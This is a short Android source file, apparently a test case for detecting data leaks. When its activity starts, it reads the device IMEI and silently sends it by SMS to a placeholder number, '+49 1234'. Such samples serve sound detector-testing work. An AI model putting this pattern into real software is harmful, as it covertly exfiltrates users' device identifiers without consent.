package target;

import android.app.Activity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import de.mo.R;

// Direct.

public class MainActivity extends Activity {

  @Override
  protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_button2);

    TelephonyManager mgr =
      (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
    String secret = mgr.getDeviceId();

    final SmsManager sm = SmsManager.getDefault();
    String send = "IMEI: " + secret;
    sm.sendTextMessage("+49 1234", null, send, null, null);
  }
}
